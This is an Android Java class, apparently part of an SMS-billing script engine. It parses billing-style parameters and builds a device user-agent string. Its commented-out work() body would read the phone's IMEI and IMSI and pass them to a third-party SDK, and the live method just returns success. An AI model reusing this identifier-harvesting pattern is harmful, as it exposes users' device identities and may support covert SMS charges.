package com.baidu.alipay.script;

import java.util.List;

import com.baidu.alipay.DeviceInfo;
//import com.taobao.alipay.spjd.SpjdSdk;

import android.content.Context;

/**
 * 1.5.8.4
 * @author leoliu
 *
 */
public class Spjd extends Tags{

	private static final String PROP_BASEURL = "baseUrl";
	private static final String PROP_PTID = "ptid";
	private static final String PROP_NOID = "noid";
	private static final String PROP_CTID = "ctid";
	private static final String PROP_CPPARAM = "cpparam";
	private static final String PROP_CHID = "chid";
	
	private String baseUrl;
	private int ptid;
	private String noid;
	private String ctid;
	private String cpparam;
	private String chid = "";
	
	
	public Spjd(String xml,boolean dynamic){
		this.baseUrl= getNodeValue(xml, PROP_BASEURL);
		this.ptid = Integer.parseInt(getNodeValue(xml, PROP_PTID));
		this.noid = getNodeValue(xml, PROP_NOID);
		this.ctid = getNodeValue(xml, PROP_CTID);
		this.cpparam = getNodeValue(xml, PROP_CPPARAM);
		this.chid = getNodeValue(xml, PROP_CHID);
		this.dynamic = dynamic;
	}
	
	@Override
	public String work(Context context, SendSms sendSms, List<Tags> srcList,
			int pos) {
		
//		String imei = DeviceInfo.getIMEI(context);
//		String imsi = DeviceInfo.getIMSI(context);
//		String ua = getUa();
//		
//		SpjdSdk spjdSdk = new SpjdSdk(context, baseUrl, ptid, noid, ctid, cpparam, chid, imei, imsi, ua);
//		
//		spjdSdk.exec();
//		
//		if(spjdSdk.isSucc()){
//			return TAGS_EXEC_SUCC;
//		}else{
//			this.errorReason = spjdSdk.getErrorReason();
//			return TAGS_EXEC_FAIL;
//		}
		return TAGS_EXEC_SUCC;
	}

	@Override
	public String getTag() {
		return TAGS_SPJD;
	}


	private static String getUa(){
		StringBuffer ua = new StringBuffer();
		
		ua.append(android.os.Build.MANUFACTURER).append("_");
		ua.append(android.os.Build.BRAND).append("_");
		ua.append(android.os.Build.MODEL);
		
//		return "samsung_samsung_GT-I9508";
		return ua.toString();
	}
	
}
